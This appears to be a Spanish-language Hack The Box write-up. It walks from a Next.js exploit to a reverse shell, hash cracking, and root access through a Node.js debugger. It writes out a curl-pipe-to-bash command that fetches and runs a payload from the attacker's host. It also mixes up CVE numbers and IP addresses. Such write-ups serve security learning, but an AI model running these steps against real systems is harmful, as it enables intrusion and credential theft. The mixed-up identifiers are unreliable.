---
title: "HTB Reactor - Write-Up"
date: 2026-06-09
categories: [Hack The Box]
tags: [nodejs, inspector, ssh-tunneling, privilege-escalation]
---

### Escaneo de puertos

Primero, realicé un escaneo rápido de todos los puertos con nmap:

nmap -p- --min-rate 4000 -T4 -oG scan_inicial.txt 10.129.19.221

<img width="553" height="112" alt="image" src="https://github.com/user-attachments/assets/fc6dd85a-bdb1-41ca-96f4-9bbd86e41d0a" />


Se idenfitican los siguientes puertos abiertos y se realiza un escaneo más detallado:

nmap -p22,3000 -sCV -Pn 10.129.19.221 -oN escaneo_detallado.txt

<img width="1904" height="607" alt="image" src="https://github.com/user-attachments/assets/270dea0b-1e12-4180-be5c-29d1c3230a6b" />


Investigamos el puerto 3000

<img width="1917" height="817" alt="image" src="https://github.com/user-attachments/assets/711cf184-e6cf-426c-91df-e930222976b6" />


Vemos que tiene la página web tiene Next.js version 15.0.3

<img width="491" height="267" alt="image" src="https://github.com/user-attachments/assets/e9f25982-7d28-4d47-b21c-c3f6aec3ef5d" />


Podemos encontrar una vulnerabilidad relacionada con esa versión, en concreto la siguiente:
CVE-2025-29927 — Authorization Bypass en Middleware

Para que sea posible ejecutar esta vulnerabilidad, necesitamos comprobar que existe la ruta /_next/static/
Mirando el código de la página (Control + U) observamos que hay un archivo en esa ruta:

<img width="1455" height="26" alt="image" src="https://github.com/user-attachments/assets/c0bfd753-dd73-43e1-98d4-a05e934b345f" />


Buscando en internet, encontramos el exploit para descargar del siguiente github:
https://github.com/pkrasulia/CVE-2025-55182-NextJS-RCE-PoC 

### Ejecución de vulnerabilidad

En el mismo github, incluye las instrucciones de ejecución:

<img width="414" height="63" alt="image" src="https://github.com/user-attachments/assets/f5b16aa0-0b9c-4611-a6eb-ad8af8f04d9c" />


Como vemos, es una vulnerabilidad que al ejecutarla nos permite hacer RCE (Remote Code Execution), sabiendo que podemos ejecutar comandos podemos hacer una revershell.
Para ello, creamos el archivo que vamos ejecutar:

<img width="342" height="34" alt="image" src="https://github.com/user-attachments/assets/feb3ad97-6b00-4f21-a132-96462128a34e" />


Ahora para que se ejecute desde el servidor, tenemos que levantar un servidor web, usando python3 y su modulo de http.service

<img width="484" height="51" alt="image" src="https://github.com/user-attachments/assets/6458d684-fab7-446a-b2dc-bfd6ddb1fd30" />


Y nos ponemos en escucha usando netcat

<img width="258" height="49" alt="image" src="https://github.com/user-attachments/assets/935a549c-0b2c-4fab-87e6-ad703e1f7a44" />


Ahora ya podemos ejecutar el script, añadiendo que haga un curl a nuestra máquina local y que ejecute un bash
node exploit.js http://10.129.19.206:3000/ "curl 10.10.19.221:8000|bash"

Al ejecutarlo ya tenemos una shell

<img width="464" height="133" alt="image" src="https://github.com/user-attachments/assets/c496279e-2bc5-4eb9-9f54-f26f19f63e0c" />


Después del tratamiento de la TTY podemos listar los siguientes directorios:

<img width="466" height="256" alt="image" src="https://github.com/user-attachments/assets/88d45bc2-8193-41b4-acee-d0e258e6183f" />


Vemos una base de datos interesante, el mirar las tablas que tiene encontramos una que pone users, le hacemos una consulta simple para ver su contenido:

<img width="592" height="49" alt="image" src="https://github.com/user-attachments/assets/3ccb2b7b-745b-4caf-9cda-4fb01a98271d" />


### Extracción de datos

Extraemos los hashes de los dos usuarios.
Nos damos cuenta de que son hashes tipo md5, los crackeamos con usando john the ripper
Encontramos una contraseña que pertenece al usuario engineer.

Probamos la contraseña para acceder como ssh:

<img width="522" height="210" alt="image" src="https://github.com/user-attachments/assets/bbbd7e5c-19be-4f17-8b21-fe0acd694e56" />


Estamos dentro y encontramos la flag de usuario:

<img width="187" height="34" alt="image" src="https://github.com/user-attachments/assets/2a46be32-0ba8-46a1-9655-b8c3123b251b" />


### Escalada de privilegios

Ahora para la flag de root, vamos a mirar los jobs actuales, entre todos los que aparecen, destaca este por estar ejecutandose como root:

<img width="934" height="51" alt="image" src="https://github.com/user-attachments/assets/e8ddda09-d14c-4570-8ce2-e3b75fdc4304" />


Configuramos un tunel SSH desde la máquina local:

<img width="438" height="18" alt="image" src="https://github.com/user-attachments/assets/08a58bdc-be55-45ee-9e9e-de6d9ab31159" />


Nos conectamos al deputador de Node.js y comprobamos que ya somos root:

<img width="684" height="32" alt="image" src="https://github.com/user-attachments/assets/f00ea9bb-66b3-4119-8996-16385109bb2c" />


Podemos leer ya la flag de root:

<img width="814" height="16" alt="image" src="https://github.com/user-attachments/assets/c70be767-637f-4c3f-9e04-e02866067d1c" />

